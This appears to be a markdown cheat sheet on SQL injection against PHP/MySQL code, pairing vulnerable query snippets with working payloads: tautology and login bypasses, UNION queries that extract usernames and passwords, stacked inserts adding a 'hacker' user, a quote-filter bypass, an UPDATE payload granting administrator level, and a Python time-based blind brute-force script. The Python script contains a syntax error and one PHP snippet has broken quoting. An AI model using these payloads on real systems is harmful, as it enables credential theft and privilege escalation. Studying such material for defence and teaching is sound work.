# SQL injection

## Basic sql injection
```php
$query = "SELECT * FROM t WHERE name ="' . $name . "'";
name = ' OR 1=1 --
```


## Retrieving all info
Suppose following code
```php
$query = "SELECT * FROM t Where name = '" . $name . "'";
while ($row = mysql_fetch_assoc($result)) {
    echo $row['name'];
    echo $row['renter'];
    echo $row['book_location'];
}
```
if name is `' OR 1=1 – '`, result will contain all entries.
## Retrieving only one entry
Suppse following code
```php
$query = "SELECT name, memo FROM t Where id = '{$name}' " ;
$result = $conn->query($query);
$row = $result->fetch_assoc();
echo $row['name'];
echo $row['memo'];
}
```
We can see here that we can only take one entry from this code. We can get entries by using offset. If we write  `id = ' OR 1=1 LIMIT x, 1 – '` we get xth row from database.
## UNION Attack
Suppose following code
```php
$query = "SELECT item, description FROM t Where name = '{$name}' ";
$result = $conn->query($query); 
while ($row = $result->fetch_assoc($result)) {
    echo $row[0];
    echo $row[1];
}
```
From this code we konw that t database has item and description columns. And we know that there is a database named USERS which has username, password fields. So, we can make union attacks by applying this query `$name = random_string' UNION SELECT
username, password FROM USERS --'`. After applying this query it the first part SELECT may return nothing, but second part will return interesting entries for us. (Note: The number of columns should be same.)
## UNION Attack with modification of entry
Suppose code below
```php
$query = " SELECT username, passwd, sensitive_info FROM t WHERE userid = '{$id}' ";

$user = $result->fetch_assoc();

if ($passwd !== $user["passwd"]) {
    echo fail("Wrong password");
    $conn->close(); 
    exit;
}

echo success(array(
    "name" => $user["username"],
    "memo" => $user["memo"]
));
```
Suppose we want to find sensitive information of the user. But there is password checker which complicate the situation, as we need to know the password. We can here apply UNION query which will change some entries of the output. If id is equal to `%' UNION SELECT 'kek', 'kek', memo FROM t -- -'`, this will add new entries to the select whose username and passwd fields are kek. Then we can just run this query and payload password with kek. 

## Administration login
Suppose following code
```php
SELECT * WHERE user='{$name}' AND pwd='{$passwd}'
```
What if we set user and passwd to `' OR pwd LIKE '%`? It will log in with the credentials of the first person in the database (typically, administrator!).

## Multiple SQL Injection Attack (obsolete)
This was possible before php mysql functions get fixed. In previous versions of mysql functions it was possible to make multiple sql injection attack. You can just send `'; INSERT INTO USERS ('uname','passwd','salt') VALUES ('hacker','38a74f', 3234);` as input. In newer versions of php, if `multi_query` is used, we can perform this kind of attack. 

## Quote Bypass
Suppose this code, which returns error if input contains whitespaces or quotes
```php
if (preg_match("/( |\t|\r|\n|\s)/", $name)) // Check whitespaces
    die(fail("No whitespaces are allowed"));
if (preg_match("/(\'|\")/", $name)) // Check quotes
    die(fail("No quotes are allowed"));
$query = "SELECT username, memo FROM t Where id = '{$name}' and passwd = '{$passwd}' " ;
$result = $conn->query($query);
```
Here we can see that we can not simply write sql injection attack as before. But what if we inject `$name = '\'` and `$passwd = or/**/id=0x61646d696e#`. The query will look like this 
```php 
SELECT name, memo FROM t WHERE id = '\' and passwd = 'or/**/id=0x61646d696e#'
```
`\'` is same character form of `'`. So quote of `id = '` will finish at `passwd = '` which is followed with or statment. In order to make space between `or id=0x61646d696e` we can use `/**/` as space which is openning and closing comment. As we can't use quotes we can encode id as bytes. We can see that `0x61646d696e` corresponds to admin in ascii. 
## Blind SQL injection
Suppose this code
```php
$query = " SELECT username, passwd, memo FROM t WHERE userid = '{$id}' ";
$result = $conn->query($query);
if (!$result) {
    echo error("SQL query error: {$conn->error}");
    $conn->close();
    exit;
}
```
What if we know that there is user with admin rights. We can bruteforce his password using blind sql injection. We can inject id as `admin' and if(substr(passwd,1,1)='a', sleep(3),0) # `. If first character of admin's password is **a** we will get answer with 3 seconds delay. We can write script that will bruteforce the password. 
```python
import requests
import time
print("Starting the bruteforce")
address = "http://example.com/endpoint.php"
for i in range(1, 10):
    for j in range(47, 123):
        URL=address+"?id=admin%27 and if(substr(passwd,"+str(i)+",1)='" chr(j) +"', sleep(3),0) # "
        start = time.time()
        res = requests.get(URL)
        end = time.time()
        if (end-start > 1):
            print("Found character: ", chr(j))

```

## Exploiting UPDATE statement
Suppose following code
```php
UPDATE users SET user_password=md5('{$passwd}')
WHERE user_id='userid'
```
If we set $passwd to `badPwd'), user_level='103', user_aim=('????????` it will update user's roles to administrator. 

## Second order SQL injection attack
[YT video](https://youtu.be/FNTwAV4xH3o)